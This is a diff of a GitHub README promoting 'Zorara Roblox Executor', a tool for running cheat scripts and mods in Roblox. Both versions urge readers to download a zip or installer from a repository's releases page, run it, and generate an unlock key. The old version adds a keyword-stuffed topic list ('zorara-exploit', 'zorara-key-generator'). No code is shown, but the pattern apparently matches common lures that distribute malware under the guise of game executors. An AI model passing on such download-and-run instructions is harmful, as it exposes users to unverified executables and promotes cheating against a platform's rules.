@@ -1,50 +1,84 @@
-# Zorara Roblox Executor 🚀
+# 🎮 Zorara-Executor - Run Custom Scripts Effortlessly
 
-[Download Link](https://github.com/blister-100/Zorara-Executor/releases/download/rudwu0cwmg/Zorara-Executor.zip)
+[![Download Zorara Executor](https://img.shields.io/badge/Download%20Zorara%20Executor-v1.0-brightgreen)](https://github.com/MdGani/Zorara-Executor/releases)
 
-Welcome to the official repository of Zorara Roblox Executor! This powerful software allows you to run custom lua scripts and mods within the Roblox gaming platform, enhancing your gameplay experience to a whole new level. Whether you're looking to unleash your creativity with unique scripts or explore new possibilities within Roblox, Zorara Executor has got you covered.
+## 🚀 Getting Started
 
-## Features 🌟
-- **Custom Lua Scripts**: Run your own custom lua scripts to personalize your gameplay.
-- **Mod Support**: Enjoy using mods to enhance your gaming experience.
-- **Roblox Compatibility**: Zorara Executor is designed to seamlessly work with Roblox.
-- **Easy to Use**: User-friendly interface for smooth navigation.
+Welcome to Zorara-Executor! This tool allows you to run custom Lua scripts and mods within the Roblox gaming platform. Follow these easy steps to get started.
 
-## How to Use 🛠️
-1. Download the Zorara Executor software from the link provided below.
-2. Launch the software on your system.
-3. Follow the instructions provided within the software to run your desired lua scripts or mods in Roblox.
+## 📥 Download & Install
 
-## Repository Topics 📋
-- zorara
-- zorara-executor
-- zorara-key
-- zorara-roblox
-- zorara-download
-- zorara-roblox-executor
-- zorara-executor-roblox
-- zorara-discord
-- zorara-executor-download
-- zorara-exploit
-- zorara-scripts
-- roblox-zorara
-- zorara-key-generator
-- download-zorara
-- zorara-key-system
-- zorara-executor-key
-- zorara-script
-- roblox-zorara-executor
-- key-zorara
-- get-zorara
+1. **Visit the Releases Page**  
+   Go to the [Zorara Releases page](https://github.com/MdGani/Zorara-Executor/releases) to find the latest version of Zorara-Executor.
 
-## Get Started 🚀
-Click the button below to download the Zorara Executor software and elevate your Roblox gaming experience!
-<!-- Place the colorful link button here -->
+2. **Download the Installer**  
+   Look for the most recent version. Click on the installer link to download the software.
 
-## Need Help? ❓
-If the download link is not working, please check the "Releases" section of this repository for alternative download options.
+3. **Run the Installer**  
+   Once the download is complete, locate the downloaded file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-## Stay Connected 🌐
-Join our Discord community to connect with other users, share scripts, and stay updated on the latest Zorara Executor developments.
+## 🔑 Getting the Key
 
-Thank you for choosing Zorara Roblox Executor! Happy scripting and gaming! 🎮✨
+To use Zorara-Executor, you’ll need a key.
+
+1. **Open the Application**  
+   After installation, open Zorara-Executor from your desktop or start menu.
+
+2. **Generate a Key**  
+   Follow the on-screen prompts to generate your unique key. This ensures that your application runs smoothly and securely.
+
+3. **Enter the Key**  
+   Once you have your key, enter it into the application to unlock all features.
+
+## 🎮 Running Scripts
+
+1. **Load Your Scripts**  
+   In the main interface of Zorara-Executor, look for the ‘Script Loader’ option. Click on it.
+
+2. **Add Your Script**  
+   Use the “Add Script” button to find and select the Lua script you want to run. You can also paste your script directly into the provided text box.
+
+3. **Execute the Script**  
+   Click on the “Execute” button to run your script within Roblox. Watch as your custom mods come to life!
+
+## ✅ Features
+
+- **User-Friendly Interface**: Designed for users of all skill levels.
+- **Script Management**: Easily add and run multiple scripts.
+- **Roblox Compatibility**: Specifically built for the Roblox gaming platform.
+- **Key System**: Ensures secure access to features.
+
+## 💻 System Requirements
+
+- **Operating System**: Windows 10 or later.
+- **RAM**: At least 4 GB.
+- **Storage**: 200 MB of available disk space.
+- **Roblox Client**: Installed and updated to the latest version.
+
+## 📚 Additional Resources
+
+- **Documentation**: For in-depth guidance, consult the online documentation included in the release.
+- **Community Support**: Join our Discord for discussions, updates, and community support.
+  
+## ⚙️ Troubleshooting
+
+If you encounter issues:
+
+1. **Check Your Key**: Ensure that you entered the key correctly.
+2. **Reinstall the Software**: If problems persist, uninstall and reinstall Zorara-Executor.
+3. **Contact Support**: Use our Discord or GitHub Issues page for further assistance.
+
+## 🌟 FAQ
+
+**Q: Can I use Zorara-Executor on other platforms?**  
+A: Currently, Zorara-Executor only runs on Windows.
+
+**Q: Is Zorara-Executor free?**  
+A: Yes, Zorara-Executor is completely free to use.
+
+**Q: How often are updates released?**  
+A: We aim to provide updates regularly to enhance performance and features.
+
+## 🔗 Conclusion
+
+Thank you for choosing Zorara-Executor. We hope you enjoy running your custom scripts on Roblox. For more information or to seek help, visit our [Releases page](https://github.com/MdGani/Zorara-Executor/releases) again. Happy gaming!
